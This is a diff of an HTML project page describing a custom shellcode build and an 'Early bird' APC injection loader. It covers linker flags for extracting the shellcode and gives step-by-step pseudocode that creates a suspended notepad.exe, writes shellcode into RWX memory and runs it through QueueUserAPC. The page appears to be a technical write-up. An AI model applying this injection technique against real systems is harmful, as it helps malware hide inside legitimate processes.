@@ -371,9 +371,11 @@
 
           Since this project is being handled in x64, <b>it is obligatory to align the program to 16 bits</b> due to a variety of factors such as <a href="https://en.wikipedia.org/wiki/Streaming_SIMD_Extensions" target="_blank">Streaming SIMD Extensions</a> (128-bit instructions) and  
           <a href="https://learn.microsoft.com/en-us/cpp/build/x64-software-conventions">8-byte offset & shadow space</a>. Fail to comply those requirements and the program crashes by access violation.
-          Furthermore, the shellcode has to be <i>extracted</i> cleanly and prevented from compiling modifications. In Visual Studio 2022 the following flags have to be modified:
+          Furthermore, the shellcode has to be <i>extracted</i> cleanly and prevented from compiling modifications. In Visual Studio 2022 the following flags have to be modified:<br><br>
+
           <b>Incremental linking /INCREMENTAL: NO</b> - Upon changing a function, the linker merely updates that specific part and jumps to a new location. <b>Ignore all default libraries /NODEFAULTLIB</b> - Default libraries add an IAT, which essentially undoes all the prior work. <b>Disable large addresses /LARGEADDRESSAWARE:NO</b> - The linker may assume specific relocations that assume a wider memory space.
-          <br>
+          <br><br>
+
           To fully confirm that the code is truly independent, no matter the system, a tool named <a href="https://pestudio.org/" target="_blank">PEStudio</a> can analyze the binary to see dependencies. 
           As seen on the illustration below, <b>it not relies on anything</b>.<br><br>
           <img src="https://raw.githubusercontent.com/capexcat/capexcat.github.io/refs/heads/main/pictures/pestudio.png" style="display: block; margin: 0 auto; max-width: 100%; height: auto;">
@@ -395,6 +397,50 @@
       </div>
       <div class="accordion-content">
         <p style="text-align: justify;">
+          While not as dense as the previous one, this section contains interesting knowledge about how the shellcode is going to be run. On a separated C++ project, three boolean functions have been 
+          declared to segment the execution properly.<br><br>
+          
+          The first one of them is named <b>CreateDebugProcess</b> which uses <i>CreateProcessA</i> to create a suspended process while targetting a legitimate 
+          process, in this case <i>notepad.exe</i>. The variant of this project is a classic one, <i>Early bird</i>, as the process is awaiting for instructions. The second function is <b>InjectShellCode</b>, 
+          as the name suggests, it prepares the target for the payload using <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex" target="_blank">VirtualAllocEx</a> and
+          <a href="https://learn.microsoft.com/es-es/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory" target="_blank">WriteProcessMemory</a> to copy it into that allocated space. Lastly, the function
+          <b>APCInjection</b> adds a task to the thread's APC queue through <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc" target="_blank">QueueUserAPC</a>, when alerted, 
+          since it has been created in a suspended state it is "conditined" to execute the APC when resumed, thus executing the payload.<br><br>
+
+          The flow of the program follows the given pseudocode:<br>
+          <code class="code-block">
+            # STAGE 1: Host Process Creation
+            FUNCTION CreateSuspendedProcess(target_exe):
+                path = "C:\\Windows\\System32\\" + target_exe
+                # Create the process in a frozen state to prevent security initialization
+                process_info = OS.CreateProcess(path, flags=CREATE_SUSPENDED)
+                RETURN process_info.handle, process_info.thread_handle
+
+            # STAGE 2: Memory Preparation
+            FUNCTION DeliverPayload(process_handle, shellcode_buffer):
+                # Allocate memory with RWX permissions (Red Flag: PAGE_EXECUTE_READWRITE)
+                remote_address = OS.VirtualAllocEx(process_handle, size=sizeof(shellcode_buffer), permissions=READ_WRITE_EXECUTE)
+    
+            # Write the malicious payload into the target process
+            OS.WriteProcessMemory(process_handle, remote_address, shellcode_buffer)
+            RETURN remote_address
+
+            # STAGE 3: Execution Hijack
+            FUNCTION ExecuteViaAPC(thread_handle, shellcode_address):
+                # Queue an Asynchronous Procedure Call pointing to the shellcode
+                # This schedules the shellcode to run as soon as the thread wakes up
+                OS.QueueUserAPC(target_function=shellcode_address, target_thread=thread_handle)
+    
+                # Resume the thread; it immediately executes the APC before the main code
+                OS.ResumeThread(thread_handle)
+
+            # --- MAIN EXECUTION FLOW ---
+            proc, thread = CreateSuspendedProcess("notepad.exe")
+            payload_addr = DeliverPayload(proc, MALICIOUS_SHELLCODE)
+            ExecuteViaAPC(thread, payload_addr)
+          </code>
+          <br>
+
         </p>
       </div>
     </div>
